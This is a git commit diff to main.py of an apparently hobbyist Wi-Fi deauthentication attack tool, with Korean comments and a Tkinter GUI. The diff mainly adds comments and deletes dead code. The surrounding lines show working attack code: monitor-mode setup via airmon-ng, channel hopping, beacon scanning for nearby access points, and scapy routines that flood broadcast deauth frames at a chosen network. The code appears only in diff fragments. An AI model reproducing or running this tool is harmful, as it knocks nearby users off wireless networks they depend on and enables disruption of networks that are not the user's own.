06430a6656cda26bcdd978eb5305c69bb6eaaf5c
nosmeri <parkdohyeon622@gmail.com>
2025-05-11 02:41:56 +0900

    clean code

--- main.py
+++ main.py
@@ -6,16 +6,21 @@ import subprocess
 import threading
 import time
 
+# deauth 공격을 위한 패킷 전송 및 채널 호핑 딜레이 설정
 DEAUTH_INTERVAL = 0.005
 HOP_INTERVAL = 0.5
+
+# 채널 호핑을 위한 채널 리스트
 SCAN_CHANNELS=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 36, 40, 44, 48, 149, 153, 157, 161, 165, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140]
 
+# 공격 관련 클래스
 class Hacker:
     def __init__(self):
         self.iface=None
         self.ap_list = []
         self.scanning=False
 
+    # 주변 AP 스캔
     def ap_scan(self):
         self.scanning=True
         print("주변 AP 스캔 중... ")
@@ -23,10 +28,14 @@ class Hacker:
         print("\n스캔 종료")
         self.scanning=False
 
+    # 패킷 핸들러
+    # AP의 SSID, BSSID, 채널 정보를 추출
     def packet_handler(self, pkt):
         if pkt.haslayer(Dot11Beacon):
             ssid = pkt[Dot11Elt].info.decode(errors='ignore')
             bssid = pkt[Dot11].addr3
+
+            # 채널 정보 추출
             channel = None
             elt = pkt[Dot11Elt]
 
@@ -52,6 +61,7 @@ class Hacker:
                 self.ap_list.append((ssid, bssid, channel))
                 print(f"SSID: {ssid}, BSSID: {bssid}, CHANNEL: {channel}")
 
+    # 인터페이스가 모니터 모드인지 확인
     def is_monitor_mode(self):
         try:
             result = subprocess.check_output(["iwconfig", self.iface]).decode()
@@ -60,11 +70,13 @@ class Hacker:
             print(e)
             return False
         
+    # 모니터 모드로 변경
     def set_monitor_mode(self):
         subprocess.run(
             ["sudo", "airmon-ng", "start", self.iface]
         )
         
+    # deauth 패킷 전송
     def deauth(self, ap, ch, ct):
         target = "ff:ff:ff:ff:ff:ff"
         dot11=Dot11(addr1=target, addr2=ap, addr3=ap)
@@ -78,6 +90,7 @@ class Hacker:
         time.sleep(0.05)
         sendp(packet, iface=self.iface, count=ct, inter=DEAUTH_INTERVAL, verbose=1)
 
+    # 채널 호핑
     def channel_hopping(self):
         while self.scanning:
             for ch in SCAN_CHANNELS:
@@ -86,7 +99,7 @@ class Hacker:
                 time.sleep(HOP_INTERVAL)
 
 
-
+# 메인 GUI 클래스
 class MainWindow(Tk,Hacker):
     def __init__(self):
         super().__init__()
@@ -97,18 +110,15 @@ class MainWindow(Tk,Hacker):
         self.title("deauthentication tool")
 
         self.bind("<Key>", self.handle_key)
-        """
-        sub_loop=threading.Thread(target=self.sub_loop_start)
-        sub_loop.daemon=True
-        sub_loop.start()"""
 
         self.set_gui()
 
-
+    # 초기 GUI 설정
     def set_gui(self):
         
         r=0
 
+        # 인터페이스 입력
         Label(self, text="interface").grid(row=r, column=0,pady=10)
 
         self.entry_iface=Entry(self)
@@ -116,15 +126,12 @@ class MainWindow(Tk,Hacker):
 
         r+=1
 
+        # 모니터 모드 변경 버튼
         Button(self, text="Set Monitor Mode", command=self.monitor_btn).grid(row=r,column=0,columnspan=2)
 
         r+=1
-
-        """
-        self.check_target = Checkbutton(self, text="Anchor Taget")
-
-        r+=1"""
         
+        # AP 스캔 버튼
         self.btn_scan = Button(self, text="AP SCAN",command=self.AP_scan_btn)
         self.btn_scan.grid(row=r,column=0,columnspan=2)
 
@@ -133,19 +140,12 @@ class MainWindow(Tk,Hacker):
         Label(self, text="AP LIST").grid(row=r,column=0,columnspan=2)
 
         r+=1
-        """
-
-        Label(self, text="SSID").grid(row=r,column=0)
-        Label(self, text="BSSID").grid(row=r,column=1)
-
-        r+=1
-        self.frame_ap_list=Frame(self)
-        self.frame_ap_list.grid(row=r, column=0, columnspan=2)"""
 
         Label(self, text="SSID | BSSID | CH").grid(row=r, column=0, columnspan=2)
 
         r+=1
 
+        # AP list를 위한 Listbox와 Scrollbar 
         scrollbar = Scrollbar(self, orient=VERTICAL)
         scrollbar.grid(row=r, column=2, sticky="ns")
 
@@ -163,6 +163,7 @@ class MainWindow(Tk,Hacker):
 
         r+=1
 
+        # deauth 공격을 위한 패킷 전송 횟수
         Label(self, text="deauth count").grid(row=r, column=0)
 
         self.entry_count=Entry(self)
@@ -170,26 +171,17 @@ class MainWindow(Tk,Hacker):
 
         r+=1
 
+        # 공격 시작 버튼
+        
         Button(self, text="공격",command=self.deauth_start).grid(row=r,column=0,columnspan=2)
 
 
-
+    # 사용자가 입력한 인터페이스를 가져옴
     def handle_key(self, event):
         self.iface=self.entry_iface.get()
-    """
-    def sub_loop_start(self):
-        packed_btn=0
-        while True:
-            if len(self.ap_list)>packed_btn:
-                new_AP=self.ap_list[packed_btn-len(self.ap_list)]
-                print(packed_btn)
-                Button(self.frame_ap_list, text=new_AP[0], command=lambda i=packed_btn: self.deauth_start(i)).grid(row=packed_btn, column=0)
-                Label(self.frame_ap_list, text=new_AP[1]).grid(row=packed_btn, column=1)
-                packed_btn+=1
-            time.sleep(1)"""
 
+    # Listbox에 AP 리스트 업데이트
     def update_ap_list(self):   
-        """ap_list에 새로 들어온 항목을 Listbox에 추가"""
         cur_size = self.listbox.size()
         if len(self.ap_list) > cur_size:
             for ssid, bssid, ch in self.ap_list[cur_size:]:
@@ -197,6 +189,7 @@ class MainWindow(Tk,Hacker):
                 self.listbox.insert(END, display)
         self.after(1000, self.update_ap_list)
 
+    # AP 스캔 버튼 클릭 시 동작
     def AP_scan_btn(self):
         if not self.iface:
             msgbox.showerror("","인터페이스를 입력해주세요")
@@ -215,11 +208,12 @@ class MainWindow(Tk,Hacker):
         self.btn_scan.config(text="스캔 종료", command=self.stop_scan, background="red")
         msgbox.showinfo("","주변 AP 스캔 시작")
 
-
+    # AP 스캔 종료
     def stop_scan(self):
         self.scanning=False
         self.btn_scan.config(text="AP SCAN", command=self.AP_scan_btn, background="LightGrey")
 
+    # deauth 공격 시작 버튼
     def deauth_start(self):
         if not self.entry_count.get().isnumeric():
             msgbox.showerror("","공격 횟수를 정확히 입력하세요.")
@@ -243,6 +237,7 @@ class MainWindow(Tk,Hacker):
         thread.start()
         msgbox.showinfo("",f"{ssid}에게 공격 시작")
 
+    # 모니터 모드 변경 버튼
     def monitor_btn(self):
         if not self.iface:
             msgbox.showerror("","인터페이스를 입력해주세요")
